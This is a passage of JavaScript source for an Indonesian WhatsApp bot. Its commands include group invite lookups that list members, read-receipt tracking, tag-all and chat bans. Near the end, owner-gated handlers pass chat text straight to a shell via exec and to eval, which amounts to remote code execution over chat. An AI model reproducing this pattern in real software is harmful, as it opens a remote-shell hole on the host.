            let { id, owner, subject, subjectOwner, desc, descId, participants, size, descOwner, descTime, creation} = await idteam.query({ 
            json: ["query", "invite",net],
            expect200:true })
            let par = `*Id* : ${id}
${owner ? `*Owner* : @${owner.split('@')[0]}` : '*Owner* : -'}
*Nama Gc* : ${subject}
*Gc dibuat Tanggal* : ${formatDate(creation * 1000)}
*Jumlah Member* : ${size}
${desc ? `*Desc* : ${desc}` : '*Desc* : tidak ada'}
*Id desc* : ${descId}
${descOwner ? `*Desc diubah oleh* : @${descOwner.split('@')[0]}` : '*Desc diubah oleh* : -'}\n*Tanggal* : ${descTime ? `${formatDate(descTime * 1000)}` : '-'}\n\n*Kontak yang tersimpan*\n`
           for ( let y of participants) {
             par += `> @${y.id.split('@')[0]}\n*Admin* : ${y.isAdmin ? 'Ya' : 'Tidak'}\n`
             jids.push(`${y.id.replace(/@c.us/g,'@s.whatsapp.net')}`)
             }
             jids.push(`${owner ? `${owner.replace(/@c.us/g,'@s.whatsapp.net')}` : '-'}`)
             jids.push(`${descOwner ? `${descOwner.replace(/@c.us/g,'@s.whatsapp.net')}` : '-'}`)
             idteam.sendMessage(from,par,text,{quoted:dev,contextInfo:{mentionedJid:jids}})
             } catch {
             reply('Link error')
             }
             break
             
            case 'setppbot':
			    idteam.updatePresence(from, Presence.composing)
					if (!isOwner) return reply3('Kalau Bukan Owner Gak Usah Banyak Tingkah Deh')
					idteam.updatePresence(from, Presence.composing) 
					if (!isQuotedImage) return reply(`Kirim gambar dengan caption ${prefix}setbotpp atau tag gambar yang sudah dikirim`)
					enmedia = JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await idteam.downloadAndSaveMediaMessage(enmedia)
					await idteam.updateProfilePicture(botNumber, media)
					reply('Makasih profil barunya😗')
					break
					
										case 'sider':
infom = await idteam.messageInfo(from, dev.message.extendedTextMessage.contextInfo.stanzaId)
tagg = []
shape = '▢'
teks = `Telah Dibaca Oleh :\n\n`
for(let i of infom.reads){
teks += shape+' ' + '@' + i.jid.split('@')[0] + '\n'
teks += `┗━ ${shape} Waktu : ` + moment(`${i.t}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss') + '\n\n'
tagg.push(i.jid)
}
mentions(teks, tagg, true)
break

					case 'banchat':
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !isOwner) return reply(mess.only.admin)
//if (!isBotGroupAdmins) return reply(mess.only.Badmin)
if (isBanchat) return reply(`udah di ban`)
bancht.push(from)
fs.writeFileSync('./database/banchat.json', JSON.stringify(bancht))
reply(`Bot berhasil Ban di group ini`)
break
case 'infoall': case 'tagall':
if (!isGroupAdmins && !itsMe) return reply(mess.only.admin)
if(!q) return reply('Ingfonya apa?')
if (!isGroup) return reply(mess.only.group)
var nom = dev.participant
members_id = []
	teks = '\n'
	for (let mem of groupMembers) {
	teks += `┣ *▢*   @${mem.jid.split('@')[0]}\n`
	members_id.push(mem.jid)
	}
mentions(`*From :@${nom.split("@s.whatsapp.net")[0]}*\n\n*Info :  ${q}*\n\n*Total Member :* ${groupMembers.length} \n\n┏━ *「 ${fake1} 」* `+teks+`┗━ *「 ${fake1} 」* `, members_id, false)
break

 
default:
if (button == 'CREATOR') {
console.log('CREATOR')
let inilist = []
for (let i of ownerNumber) {
const vname = idteam.contacts[i] != undefined ? idteam.contacts[i].vname || idteam.contacts[i].notify : undefined
inilist.push({
"displayName": 'ID Team',
"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Sy;Bot;;;\nFN:${vname ? `${vname}` : `${idteam.user.name}`}\nitem1.TEL;waid=${i.split('@')[0]}:${i.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
})
}
hehe = await idteam.sendMessage(from, {
"displayName": `${inilist.length} kontak`,
"contacts": inilist 
}, 'contactsArrayMessage', { quoted: dev })
idteam.sendMessage(from,'Nih Kak Creator ID Bot',text,{quoted: hehe})
}
if (button == 'GITHUB') {
console.log('GITHUB')
idteam.sendMessage(from, `*Nih kak github ID Team*\n*Scnya free kak dan juga free api 🤗*\n*Ingat ! jangan diperjual belikan yah !*\n\nhttps://github.com/idteamteam404`, text, {quoted: dev})
}
if (button == 'REST API') {
console.log('REST API')
idteam.sendMessage(from, `*Nih kak rest api yang digunakan oleh ID Team Dan juga free*\n\nhttps://idteam-api.herokuapp.com/api\n\n*Gunakan dengan bijak dan jangan spam yah kak 🙏🏻*`, text, {"contextInfo": {text: 'HelloWorld',"forwardingScore": 3,isForwarded: true,sendEphemeral: true,mentionedJid: [sender],"externalAdReply": {"title": `Hallo kak ${pushname}`,"body": ``,"previewType": "PHOTO","thumbnailUrl": `https://telegra.ph/file/a082de791ef8aff96ec24.jpg`,"thumbnail": "","sourceUrl": ""}}, quoted: dev})
}
if (budy.startsWith('$')){
if (!dev.key.fromMe && !isOwner) return
qur = budy.slice(2)
exec(qur, (err, stdout) => {
if (err) return reply(`@ID Team:~ ${err}`)
if (stdout) {
reply(stdout)
}
})
}
if (budy.startsWith('>')){
if (!dev.key.fromMe && !isOwner) return
try {
return idteam.sendMessage(from, JSON.stringify(eval(budy.slice(2)),null,'\t'),text, {quoted: dev})
} catch(err) {
e = String(err)
reply(e)
}
}

if (budy.startsWith('=>')){
if (!isOwner && !dev.key.fromMe) return
var konsol = budy.slice(3)
Return = (sul) => {
var sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined){
bang = util.format(sul)
}
return reply(bang)
}
try {
reply(util.format(eval(`;(async () => { ${konsol} })()`)))
console.log('\x1b[1;37m>', '[', '\x1b[1;32mEXEC\x1b[1;37m', ']', time, color(">", "green"), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
} catch(e){
reply(String(e))
}
}

	}
if (isGroup && budy != undefined) {
	} else {
	console.log(color('[TEXT]', 'aqua'), `${fake}`, color(sender.split('@')[0]))
	}		
	} catch (e) {
    e = String(e)
    if (!e.includes("this.isZero")) {
	console.log('Message : %s', color(e, 'green'))
        }
	// console.log(e)
	}
}


	
    
